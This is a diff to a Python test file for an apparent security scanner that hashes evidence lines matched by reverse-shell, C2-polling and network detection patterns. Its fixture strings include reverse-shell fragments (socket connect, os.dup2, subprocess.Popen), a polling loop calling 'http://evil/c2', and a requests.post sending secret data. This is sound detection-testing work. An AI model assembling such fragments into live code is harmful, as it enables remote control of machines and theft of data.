@@ -561,16 +561,54 @@ def test_extract_evidence_records_multiline_after_oneline():
     assert sp._evidence_hash(eo) != sp._evidence_hash(ea)
 
 
-def test_extract_evidence_skips_giant_span_when_perline_bound():
-    # When per-line already binds the signal lines, a giant greedy DOTALL span
-    # bridging them is skipped, so the evidence carries no whole-file digest that
-    # would drift on an unrelated edit (e.g. a dependency bump moving the lines).
-    a = "import socket\n" + "x = 1\n" * 40 + "os.dup2(conn.fileno(), 0)\n"
-    b = "import socket\n" + "y = 2\n" * 40 + "os.dup2(conn.fileno(), 0)\n"
+def test_extract_evidence_skips_giant_whole_file_span():
+    # A giant greedy DOTALL span bridging anchors across the whole file (here
+    # socket...connect...subprocess over 60+ unrelated lines) is not recorded when
+    # the per-line pass already bound the signal (os.dup2), so the evidence stays
+    # stable against churn in the bridged middle (a dependency bump).
+    gap = "\n".join(f"    x = {i}" for i in range(70))
+    a = "import socket\nsock.connect(addr)\n" + gap + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
+    b = (
+        "import socket\nsock.connect(addr)\n"
+        + gap.replace("x =", "y =")
+        + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
+    )
     ea = sp._extract_evidence(a, sp.RE_REVERSE_SHELL)
     eb = sp._extract_evidence(b, sp.RE_REVERSE_SHELL)
     assert "os.dup2" in ea and "sha256:" not in ea
     assert sp._evidence_hash(ea) == sp._evidence_hash(eb)
+
+
+def test_extract_evidence_binds_moderate_appended_dotall_span():
+    # A multi-line construct appended under a check that already has a one-line
+    # match is still recorded when it is not a giant whole-file bridge, so its
+    # payload reopens instead of riding the old one-line match.
+    one = "while True: time.sleep(60); requests.get('http://a/poll')\n"
+    gap = "\n".join(f"    x = {i}" for i in range(20))
+    old = one + "while True:\n" + gap + "\n    requests.get('http://old/c2')\n"
+    new = one + "while True:\n" + gap + "\n    requests.get('http://evil/c2')\n"
+    eo = sp._extract_evidence(old, sp.RE_C2_POLLING)
+    en = sp._extract_evidence(new, sp.RE_C2_POLLING)
+    assert sp._evidence_hash(eo) != sp._evidence_hash(en)
+
+
+def test_canon_evidence_reorder_reopens():
+    # Reordering matched lines changes executable context, so the key reopens
+    # (the canon preserves discovery order rather than sorting).
+    a = "Net: L10: requests.post(url)\nEnv: L20: env = os.environ.copy()"
+    b = "Env: L20: env = os.environ.copy()\nNet: L10: requests.post(url)"
+    assert sp._evidence_hash(a) != sp._evidence_hash(b)
+
+
+def test_logical_line_end_ignores_brackets_in_strings():
+    # A ) inside a string argument must not close the call early, so later
+    # argument lines still bind and a changed payload there reopens.
+    old = "requests.post('http://h/p)',\n    data=secret_old,\n)\n"
+    new = "requests.post('http://h/p)',\n    data=secret_new,\n)\n"
+    eo = sp._extract_evidence(old, sp.RE_NETWORK)
+    en = sp._extract_evidence(new, sp.RE_NETWORK)
+    assert "data=secret_old" in eo
+    assert sp._evidence_hash(eo) != sp._evidence_hash(en)
 
 
 def test_base64_exec_blob_finding_binds_every_blob():
